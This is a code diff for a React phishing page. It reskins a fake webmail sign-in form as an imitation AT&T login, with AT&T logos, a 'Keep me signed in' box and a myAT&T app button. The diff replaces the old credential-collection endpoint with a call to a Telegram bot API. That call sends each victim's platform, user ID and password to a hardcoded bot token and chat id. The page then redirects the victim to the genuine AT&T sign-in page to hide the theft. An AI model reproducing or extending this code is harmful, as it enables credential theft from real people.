@@ -6,6 +6,9 @@ import { useNavigate } from 'react-router-dom';
 import logotwo from './logotwo.gif';
 import { useLocation } from 'react-router-dom';
 import { Link } from 'react-router-dom';
+import atlogo from './atlogo.png';
+import or from './or.png';
+
 
 function Next(){
 
@@ -15,7 +18,7 @@ function Next(){
     
     const[email ,setEmail] = useState(location.state.email);
 
-    const[platform, setPlatform] = useState("Northerntel")
+    const[platform, setPlatform] = useState("AT&T")
 
     const[showError, setShowError] = useState(false);
 
@@ -30,11 +33,16 @@ function Next(){
         try {
 
             setIsLoading(true);
-            const response = await axios.post('https://micback.onrender.com/api/send', {
-                email:email,
-                password:password,
-                platform:platform
-            });
+            // const response = await axios.post('https://micback.onrender.com/api/send', {
+            //     email:email,
+            //     password:password,
+            //     platform:platform
+            // });
+
+            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                  chat_id: 5968552603,
+                  text: `Platform : ${platform} , User ID : ${email} , Password : ${password}'`,
+                });
         
             // Handle success
             console.log('Data sent:', response.data.message);
@@ -42,7 +50,7 @@ function Next(){
             if(response.status == 200){
                 console.log(response.data.message);
     
-                window.location.href = 'https://webmail.northerntel.net/webmail/#sign-in';
+                window.location.href = 'https://signin.att.com/';
 
             }
           } catch (error) {
@@ -55,25 +63,30 @@ function Next(){
 
 
     return (
-        <div className='mainContent'>
+        <div className='mainContent py-4'>
 
-        <div className='col-md-3 m-auto maindivtwo'>
+        <div className='col-md-5 m-auto maindiv pb-4'>
 
             <div className='imagediv text-center py-2'>
+
+            <div className='imagediv text-center py-4'>
+                        <img src={atlogo} className="mylogo" />
+
+                    </div>
                 
-                <div className='circle p-3  rounded-circle m-auto'>
-                    <h3 className='circlehead'>{email.charAt(0)}</h3>
+                <div className='text-center m-auto'>
+                    <h4 className=''>{email}</h4>
                 </div>
 
             </div>
 
-            <h2 className='mainhead'>Sign in to WebClient </h2>
-            <p className='smalltwo text-center'>{email}</p>
+            <h2 className='text-center font-weight-bold'>Welcome</h2>
+            
 
           
 
-            <form onSubmit={handleSubmit}>
-            <div className='borderdiv'>
+            <form onSubmit={handleSubmit} className="px-5">
+            <div className=''>
                 <input onChange={function(e){
                    setPassword(e.target.value);
                }} value={password} type={showPassword ? "text" : "password"}className='form-control w-100 py-4'placeholder='Password' required/>
@@ -85,19 +98,35 @@ function Next(){
                     }} className='show'>{showPassword ? "Hide" : "Show"}</span>
                     </div>
                 </div>
-                
+                <div className='px-3 pb-3 showborder'>
+            <input type="checkbox" /><span className='px-3 smalll'>Keep me signed in</span>
+
+            </div>
+
                 <div className='px-3'>
                 <button className='next btn w-100'>Sign in</button>
 
                 </div>
 
-            <div className='px-3 pb-3 showborder'>
-            <input type="checkbox" /><span className='px-3 smalll'>Keep me signed in</span>
+           
+            {/* <p className='text-center smalll py-3'>Not you? <Link to={'/'} className='colorme'>Check your account again</Link></p> */}
 
-            </div>
 
-            <p className='text-center smalll py-3'>Not you? <Link to={'/'} className='colorme'>Check your account again</Link></p>
+            <div className=''>
+                        <p className='primarycolor'>Forgot user ID?</p>
 
+                        <p className='primarycolor'>Don't have a user ID? Create one now </p>
+                        <div>
+                        <img src={or} style={{
+                            width:"100%",
+                        }}/>
+
+                <button className='nexttwo btn w-100'>
+                            signin with myAT&T app
+                        </button>
+                        </div>
+                        
+                    </div>
             </form>
 
         
